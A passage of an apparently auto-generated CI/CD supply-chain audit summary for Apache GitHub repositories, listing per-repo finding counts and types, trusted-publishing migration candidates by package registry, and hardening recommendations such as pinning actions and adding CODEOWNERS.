| apache/casbin-rust-redis-watcher | crates_io | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-rust-redis-watcher) · [security](security.md#apachecasbin-rust-redis-watcher) |
| apache/casbin-sequelize-adapter | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-sequelize-adapter) · [security](security.md#apachecasbin-sequelize-adapter) |
| apache/casbin-server | docker_hub | 4 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-server) · [security](security.md#apachecasbin-server) |
| apache/casbin-sqlx-adapter | crates_io | 4 | run_block_injection | migrate | [publishing](publishing.md#apachecasbin-sqlx-adapter) · [security](security.md#apachecasbin-sqlx-adapter) |
| apache/casbin-typeorm-adapter | npm | 4 | unpinned_actions | migrate | [publishing](publishing.md#apachecasbin-typeorm-adapter) · [security](security.md#apachecasbin-typeorm-adapter) |
| apache/causeway | github_packages | 4 | unpinned_actions | — | [publishing](publishing.md#apachecauseway) · [security](security.md#apachecauseway) |
| apache/couchdb-mochiweb | hex | 4 | unpinned_actions | — | [publishing](publishing.md#apachecouchdb-mochiweb) · [security](security.md#apachecouchdb-mochiweb) |
| apache/doris-thirdparty | github_releases | 4 | run_block_injection | — | [publishing](publishing.md#apachedoris-thirdparty) · [security](security.md#apachedoris-thirdparty) |
| apache/gobblin | docker_hub | 4 | unpinned_actions | — | [publishing](publishing.md#apachegobblin) · [security](security.md#apachegobblin) |
| apache/knox | docker_hub | 4 | run_block_injection | — | [publishing](publishing.md#apacheknox) · [security](security.md#apacheknox) |
| apache/airavata | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apacheairavata) · [security](security.md#apacheairavata) |
| apache/airflow-publish | pypi | 3 | unpinned_actions | — | [publishing](publishing.md#apacheairflow-publish) · [security](security.md#apacheairflow-publish) |
| apache/amoro | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apacheamoro) · [security](security.md#apacheamoro) |
| apache/apisix-docker | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apacheapisix-docker) · [security](security.md#apacheapisix-docker) |
| apache/casbin-editor | github_releases | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-editor) · [security](security.md#apachecasbin-editor) |
| apache/casbin-mesh | ghcr | 3 | unpinned_actions | — | [publishing](publishing.md#apachecasbin-mesh) · [security](security.md#apachecasbin-mesh) |
| apache/dubbo-initializer | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apachedubbo-initializer) · [security](security.md#apachedubbo-initializer) |
| apache/dubbo-kubernetes | github_releases | 3 | unpinned_actions | — | [publishing](publishing.md#apachedubbo-kubernetes) · [security](security.md#apachedubbo-kubernetes) |
| apache/eventmesh | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apacheeventmesh) · [security](security.md#apacheeventmesh) |
| apache/eventmesh-dashboard | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apacheeventmesh-dashboard) · [security](security.md#apacheeventmesh-dashboard) |
| apache/flink-docker | ghcr | 3 | unpinned_actions | — | [publishing](publishing.md#apacheflink-docker) · [security](security.md#apacheflink-docker) |
| apache/kyuubi-docker | docker_hub | 3 | unpinned_actions | — | [publishing](publishing.md#apachekyuubi-docker) · [security](security.md#apachekyuubi-docker) |
| apache/activemq | maven_central | 2 | unpinned_actions | — | [publishing](publishing.md#apacheactivemq) · [security](security.md#apacheactivemq) |
| apache/camel-kafka-connector | maven_central | 2 | unpinned_actions | — | [publishing](publishing.md#apachecamel-kafka-connector) · [security](security.md#apachecamel-kafka-connector) |
| apache/grails-forge-ui | github_releases | 2 | unpinned_actions | — | [publishing](publishing.md#apachegrails-forge-ui) · [security](security.md#apachegrails-forge-ui) |

## Low Risk: Publishing Repos

70 repos publish packages with only LOW/INFO-level security findings (missing CODEOWNERS, no dependabot config).

<details>
<summary>Show 70 repos</summary>

- **apache/arrow-adbc** — maven_central, npm, pypi — 11 findings ([publishing](publishing.md#apachearrow-adbc) · [security](security.md#apachearrow-adbc))
- **apache/grails-quartz** — apache_dist, github_pages, github_releases, maven_central — 4 findings ([publishing](publishing.md#apachegrails-quartz) · [security](security.md#apachegrails-quartz))
- **apache/grails-redis** — apache_dist, github_pages, github_releases, maven_central — 4 findings ([publishing](publishing.md#apachegrails-redis) · [security](security.md#apachegrails-redis))
- **apache/grails-spring-security** — apache_dist, github_pages, github_releases, maven_central — 4 findings ([publishing](publishing.md#apachegrails-spring-security) · [security](security.md#apachegrails-spring-security))
- **apache/fineract** — docker_hub, maven_central — 9 findings ([publishing](publishing.md#apachefineract) · [security](security.md#apachefineract))
- **apache/incubator-baremaps** — apache_dist, github_releases, maven_central — 5 findings ([publishing](publishing.md#apacheincubator-baremaps) · [security](security.md#apacheincubator-baremaps))
- **apache/arrow-java** — github_pages, github_releases — 5 findings ([publishing](publishing.md#apachearrow-java) · [security](security.md#apachearrow-java))
- **apache/apisix** — docker_hub — 6 findings ([publishing](publishing.md#apacheapisix) · [security](security.md#apacheapisix))
- **apache/buildstream** — github_releases, pypi — 3 findings ([publishing](publishing.md#apachebuildstream) · [security](security.md#apachebuildstream))
- **apache/camel-karavan** — ghcr — 6 findings ([publishing](publishing.md#apachecamel-karavan) · [security](security.md#apachecamel-karavan))
- **apache/casbin-node-casbin-session-role-manager** — github_releases, npm — 3 findings ([publishing](publishing.md#apachecasbin-node-casbin-session-role-manager) · [security](security.md#apachecasbin-node-casbin-session-role-manager))
- **apache/casbin-rust-yaml-adapter** — crates_io, github_releases — 3 findings ([publishing](publishing.md#apachecasbin-rust-yaml-adapter) · [security](security.md#apachecasbin-rust-yaml-adapter))
- **apache/casbin-website-v3** — github_releases, npm — 3 findings ([publishing](publishing.md#apachecasbin-website-v3) · [security](security.md#apachecasbin-website-v3))
- **apache/daffodil** — apache_dist, maven_central — 3 findings ([publishing](publishing.md#apachedaffodil) · [security](security.md#apachedaffodil))
- **apache/grails-github-actions** — apache_dist, github_releases — 3 findings ([publishing](publishing.md#apachegrails-github-actions) · [security](security.md#apachegrails-github-actions))
- **apache/apisix-helm-chart** — github_releases, helm — 2 findings ([publishing](publishing.md#apacheapisix-helm-chart) · [security](security.md#apacheapisix-helm-chart))
- **apache/arrow-dotnet** — github_releases, nuget — 2 findings ([publishing](publishing.md#apachearrow-dotnet) · [security](security.md#apachearrow-dotnet))
- **apache/casbin-Casbin.NET-redis-watcher** — github_packages, nuget — 2 findings ([publishing](publishing.md#apachecasbin-casbinnet-redis-watcher) · [security](security.md#apachecasbin-casbinnet-redis-watcher))
- **apache/casbin-aspnetcore** — github_packages, nuget — 2 findings ([publishing](publishing.md#apachecasbin-aspnetcore) · [security](security.md#apachecasbin-aspnetcore))
- **apache/casbin-efcore-adapter** — github_packages, nuget — 2 findings ([publishing](publishing.md#apachecasbin-efcore-adapter) · [security](security.md#apachecasbin-efcore-adapter))
- **apache/casbin-jcasbin-kafka-watcher** — github_releases, maven_central — 2 findings ([publishing](publishing.md#apachecasbin-jcasbin-kafka-watcher) · [security](security.md#apachecasbin-jcasbin-kafka-watcher))
- **apache/casbin-jcasbin-postgres-watcher** — github_releases, maven_central — 2 findings ([publishing](publishing.md#apachecasbin-jcasbin-postgres-watcher) · [security](security.md#apachecasbin-jcasbin-postgres-watcher))
- **apache/casbin-jcasbin-pulsar-authz** — github_releases, maven_central — 2 findings ([publishing](publishing.md#apachecasbin-jcasbin-pulsar-authz) · [security](security.md#apachecasbin-jcasbin-pulsar-authz))
- **apache/casbin-node-casbin-etcd-watcher** — github_releases, npm — 2 findings ([publishing](publishing.md#apachecasbin-node-casbin-etcd-watcher) · [security](security.md#apachecasbin-node-casbin-etcd-watcher))
- **apache/casbin-python-async-django-orm-adapter** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-async-django-orm-adapter) · [security](security.md#apachecasbin-python-async-django-orm-adapter))
- **apache/casbin-python-async-postgres-watcher** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-async-postgres-watcher) · [security](security.md#apachecasbin-python-async-postgres-watcher))
- **apache/casbin-python-casbin-databases-adapter** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-casbin-databases-adapter) · [security](security.md#apachecasbin-python-casbin-databases-adapter))
- **apache/casbin-python-django-casbin-auth** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-django-casbin-auth) · [security](security.md#apachecasbin-python-django-casbin-auth))
- **apache/casbin-python-django-orm-adapter** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-django-orm-adapter) · [security](security.md#apachecasbin-python-django-orm-adapter))
- **apache/casbin-python-etcd-watcher** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-etcd-watcher) · [security](security.md#apachecasbin-python-etcd-watcher))
- **apache/casbin-python-postgresql-watcher** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-postgresql-watcher) · [security](security.md#apachecasbin-python-postgresql-watcher))
- **apache/casbin-python-redis-watcher** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-redis-watcher) · [security](security.md#apachecasbin-python-redis-watcher))
- **apache/casbin-python-sanic-authz** — github_releases, pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-sanic-authz) · [security](security.md#apachecasbin-python-sanic-authz))
- **apache/casbin-spring-boot-starter** — github_releases, maven_central — 2 findings ([publishing](publishing.md#apachecasbin-spring-boot-starter) · [security](security.md#apachecasbin-spring-boot-starter))
- **apache/daffodil-vscode** — apache_dist, maven_central — 2 findings ([publishing](publishing.md#apachedaffodil-vscode) · [security](security.md#apachedaffodil-vscode))
- **apache/directory-scimple** — apache_dist, maven_central — 2 findings ([publishing](publishing.md#apachedirectory-scimple) · [security](security.md#apachedirectory-scimple))
- **apache/commons-crypto** — maven_central — 4 findings ([publishing](publishing.md#apachecommons-crypto) · [security](security.md#apachecommons-crypto))
- **apache/commons-io** — maven_central — 4 findings ([publishing](publishing.md#apachecommons-io) · [security](security.md#apachecommons-io))
- **apache/commons-net** — maven_central — 4 findings ([publishing](publishing.md#apachecommons-net) · [security](security.md#apachecommons-net))
- **apache/couchdb-helm** — github_pages, helm — 1 findings ([publishing](publishing.md#apachecouchdb-helm) · [security](security.md#apachecouchdb-helm))
- **apache/echarts** — npm — 4 findings ([publishing](publishing.md#apacheecharts) · [security](security.md#apacheecharts))
- **apache/kafka** — docker_hub — 4 findings ([publishing](publishing.md#apachekafka) · [security](security.md#apachekafka))
- **apache/airflow** — docker_hub — 3 findings ([publishing](publishing.md#apacheairflow) · [security](security.md#apacheairflow))
- **apache/arrow-swift** — github_releases — 3 findings ([publishing](publishing.md#apachearrow-swift) · [security](security.md#apachearrow-swift))
- **apache/camel-kameleon** — ghcr — 3 findings ([publishing](publishing.md#apachecamel-kameleon) · [security](security.md#apachecamel-kameleon))
- **apache/carbondata** — github_packages — 3 findings ([publishing](publishing.md#apachecarbondata) · [security](security.md#apachecarbondata))
- **apache/commons-numbers** — maven_central — 3 findings ([publishing](publishing.md#apachecommons-numbers) · [security](security.md#apachecommons-numbers))
- **apache/cordova-android** — apache_dist — 3 findings ([publishing](publishing.md#apachecordova-android) · [security](security.md#apachecordova-android))
- **apache/cordova-coho** — npm — 3 findings ([publishing](publishing.md#apachecordova-coho) · [security](security.md#apachecordova-coho))
- **apache/cordova-eslint** — apache_dist — 3 findings ([publishing](publishing.md#apachecordova-eslint) · [security](security.md#apachecordova-eslint))
- **apache/cordova-ios** — apache_dist — 3 findings ([publishing](publishing.md#apachecordova-ios) · [security](security.md#apachecordova-ios))
- **apache/cordova-plugin-camera** — apache_dist — 3 findings ([publishing](publishing.md#apachecordova-plugin-camera) · [security](security.md#apachecordova-plugin-camera))
- **apache/drill** — maven_central — 3 findings ([publishing](publishing.md#apachedrill) · [security](security.md#apachedrill))
- **apache/dubbo-admin** — github_releases — 3 findings ([publishing](publishing.md#apachedubbo-admin) · [security](security.md#apachedubbo-admin))
- **apache/airavata-mft** — github_releases — 2 findings ([publishing](publishing.md#apacheairavata-mft) · [security](security.md#apacheairavata-mft))
- **apache/arrow-js** — github_releases — 2 findings ([publishing](publishing.md#apachearrow-js) · [security](security.md#apachearrow-js))
- **apache/axis-axis2-java-core** — maven_central — 2 findings ([publishing](publishing.md#apacheaxis-axis2-java-core) · [security](security.md#apacheaxis-axis2-java-core))
- **apache/casbin-Casbin.NET-dotnet-cli** — github_releases — 2 findings ([publishing](publishing.md#apachecasbin-casbinnet-dotnet-cli) · [security](security.md#apachecasbin-casbinnet-dotnet-cli))
- **apache/casbin-Casbin.NET-ef-adapter** — nuget — 2 findings ([publishing](publishing.md#apachecasbin-casbinnet-ef-adapter) · [security](security.md#apachecasbin-casbinnet-ef-adapter))
- **apache/casbin-casbin.js** — npm — 2 findings ([publishing](publishing.md#apachecasbin-casbinjs) · [security](security.md#apachecasbin-casbinjs))
- **apache/casbin-node-casbin-basic-adapter** — npm — 2 findings ([publishing](publishing.md#apachecasbin-node-casbin-basic-adapter) · [security](security.md#apachecasbin-node-casbin-basic-adapter))
- **apache/casbin-python-async-sqlalchemy-adapter** — pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-async-sqlalchemy-adapter) · [security](security.md#apachecasbin-python-async-sqlalchemy-adapter))
- **apache/casbin-python-flask-authz** — pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-flask-authz) · [security](security.md#apachecasbin-python-flask-authz))
- **apache/casbin-python-sqlalchemy-adapter** — pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-sqlalchemy-adapter) · [security](security.md#apachecasbin-python-sqlalchemy-adapter))
- **apache/casbin-python-sqlobject-adapter** — pypi — 2 findings ([publishing](publishing.md#apachecasbin-python-sqlobject-adapter) · [security](security.md#apachecasbin-python-sqlobject-adapter))
- **apache/cayenne** — maven_central — 2 findings ([publishing](publishing.md#apachecayenne) · [security](security.md#apachecayenne))
- **apache/echarts-examples** — npm — 2 findings ([publishing](publishing.md#apacheecharts-examples) · [security](security.md#apacheecharts-examples))
- **apache/karaf-minho** — maven_central — 2 findings ([publishing](publishing.md#apachekaraf-minho) · [security](security.md#apachekaraf-minho))
- **apache/kyuubi-shaded** — maven_central — 2 findings ([publishing](publishing.md#apachekyuubi-shaded) · [security](security.md#apachekyuubi-shaded))
- **apache/camel-kamelets** — maven_central — 1 findings ([publishing](publishing.md#apachecamel-kamelets) · [security](security.md#apachecamel-kamelets))

</details>

## Trusted Publishing Opportunities

**70** repos use long-lived tokens to publish to ecosystems that support OIDC trusted publishing. Migrating eliminates stored secrets.

Full details: [publishing.md → Trusted Publishing](publishing.md#trusted-publishing-migration-opportunities)

- **NuGet**: arrow-dotnet, casbin-Casbin.NET, casbin-Casbin.NET-ef-adapter, casbin-Casbin.NET-redis-adapter, casbin-Casbin.NET-redis-watcher, casbin-aspnetcore, casbin-efcore-adapter
- **PyPI**: airflow-publish, arrow-adbc, arrow-nanoarrow, beam, buildstream, casbin-pycasbin, casbin-python-async-django-orm-adapter, casbin-python-async-postgres-watcher, casbin-python-async-sqlalchemy-adapter, casbin-python-casbin-databases-adapter, casbin-python-django-casbin-auth, casbin-python-django-orm-adapter, casbin-python-etcd-watcher, casbin-python-fastapi-casbin-auth, casbin-python-flask-authz, casbin-python-graphql-authz, casbin-python-postgresql-watcher, casbin-python-pymongo-adapter, casbin-python-rabbitmq-watcher, casbin-python-redis-adapter, casbin-python-redis-watcher, casbin-python-sanic-authz, casbin-python-sqlalchemy-adapter, casbin-python-sqlobject-adapter, fluss-rust, fory, hamilton, hudi-rs
- **crates.io**: casbin-actix-casbin-auth, casbin-axum-casbin, casbin-rs, casbin-rust-actix-casbin, casbin-rust-casbin-rust-cli, casbin-rust-diesel-adapter, casbin-rust-dufs-with-casbin, casbin-rust-postgres-adapter, casbin-rust-redis-watcher, casbin-rust-rocket-authz, casbin-rust-semantic-release-action-rust, casbin-rust-string-adapter, casbin-rust-yaml-adapter, casbin-sqlx-adapter, fluss-rust, fory, hudi-rs
- **npm**: arrow-adbc, casbin-casbin.js, casbin-core, casbin-js-vue-authz, casbin-nest-authz, casbin-node-casbin, casbin-node-casbin-basic-adapter, casbin-node-casbin-couchdb-adapter, casbin-node-casbin-drizzle-adapter, casbin-node-casbin-etcd-watcher, casbin-node-casbin-expression-eval, casbin-node-casbin-file-adapter, casbin-node-casbin-mongo-changestream-watcher, casbin-node-casbin-mongoose-adapter, casbin-node-casbin-node-redis-adapter, casbin-node-casbin-prisma-adapter, casbin-node-casbin-redis-watcher, casbin-node-casbin-session-role-manager, casbin-sequelize-adapter, casbin-typeorm-adapter, casbin-vscode-plugin, casbin-website-v3, cordova-coho, echarts, echarts-examples

## Key Recommendations

1. **Migrate to trusted publishing.** 70 repos can eliminate long-lived secrets by adopting OIDC. Start with repos publishing to PyPI and npm — [migration guide](publishing.md#trusted-publishing-migration-opportunities).
2. **Review HIGH-severity findings.** 11 repos have HIGH findings that need investigation ([details](security.md#high-findings)).
3. **Audit composite action callers.** 30 repos have composite actions that interpolate `inputs.*` in shell blocks. Not exploitable today if callers pass trusted values only — verify no workflow passes PR titles, branch names, or comment bodies.
4. **Pin actions to SHA hashes.** All 1205 repos use mutable tag refs. See the [unpinned actions findings](security.md#medium-findings) for per-repo counts.
5. **Add CODEOWNERS with `.github/` coverage.** 1193 repos have no CODEOWNERS file. Workflow changes can bypass security review.

---

*Generated from [publishing.md](publishing.md) and [security.md](security.md).*